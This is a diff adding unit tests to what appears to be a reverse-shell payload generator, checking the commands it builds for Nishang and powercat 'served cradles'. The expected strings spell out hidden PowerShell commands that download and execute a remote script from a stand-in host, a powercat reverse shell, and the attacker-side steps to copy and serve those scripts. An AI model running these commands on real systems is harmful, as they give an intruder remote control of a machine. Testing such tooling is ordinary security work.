@@ -125,6 +125,48 @@ describe("REVERSE_SHELLS", () => {
   });
 });
 
+describe("served cradles: the Kali-side prepare step", () => {
+  it("Nishang: copy, append the filled call, serve on 80; the cradle fetches from :80", () => {
+    const b = buildPayload(def("nishang-cradle"), "powershell", V);
+    expect(b.prepare).toBe([
+      "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1",
+      "echo 'Invoke-PowerShellTcp -Reverse -IPAddress 192.0.2.10 -Port 443' >> rev.ps1",
+      "python3 -m http.server 80",
+    ].join("\n"));
+    expect(b.text).toBe(`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')"`);
+    for (const t of ["cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1", "echo 'Invoke-PowerShellTcp", "python3 -m http.server"]) {
+      expect(b.parts.some((p) => p.token.startsWith(t)), t).toBe(true);
+    }
+    expect(b.notes.join(" ")).not.toMatch(/Serve it first/);
+  });
+
+  it("Nishang with LPORT 80: the web server moves to 8000 and the cradle says :8000", () => {
+    const b = buildPayload(def("nishang-cradle"), "cmd", { LHOST: "192.0.2.10", LPORT: "80" });
+    expect(b.prepare).toBe([
+      "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1",
+      "echo 'Invoke-PowerShellTcp -Reverse -IPAddress 192.0.2.10 -Port 80' >> rev.ps1",
+      "python3 -m http.server 8000",
+    ].join("\n"));
+    expect(b.text).toBe(`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.10:8000/rev.ps1')"`);
+    expect(b.listener).toBe("penelope -O -p 80");
+    expect(b.unresolved).toEqual([]);
+  });
+
+  it("powercat: copy powercat.ps1 and serve on 80; with LPORT 80, 8000 and :8000", () => {
+    const b = buildPayload(def("powercat-cradle"), "powershell", V);
+    expect(b.prepare).toBe("cp /usr/share/windows-resources/powercat/powercat.ps1 .\npython3 -m http.server 80");
+    expect(b.text).toBe("IEX(New-Object System.Net.WebClient).DownloadString('http://192.0.2.10/powercat.ps1');powercat -c 192.0.2.10 -p 443 -e powershell");
+    expect(b.parts.some((p) => p.token.startsWith("cp /usr/share/windows-resources/powercat/powercat.ps1"))).toBe(true);
+    const on80 = buildPayload(def("powercat-cradle"), "powershell", { LHOST: "192.0.2.10", LPORT: "80" });
+    expect(on80.prepare).toBe("cp /usr/share/windows-resources/powercat/powercat.ps1 .\npython3 -m http.server 8000");
+    expect(on80.text).toBe("IEX(New-Object System.Net.WebClient).DownloadString('http://192.0.2.10:8000/powercat.ps1');powercat -c 192.0.2.10 -p 80 -e powershell");
+  });
+
+  it("a payload with nothing to serve has no prepare step", () => {
+    expect(buildPayload(def("bash-tcp"), "bash-prompt", V).prepare).toBeNull();
+  });
+});
+
 // Every def in every context it declares, as pasted (spec §4.3). Synthetic values only. The expected strings come from
 // an independent model of the wrapping rules (bash -c, the URL set, PHP escaping, doubled SQL quotes, VBA chunks).
 // This base64 has no + / or =, so it reads the same inside a URL.
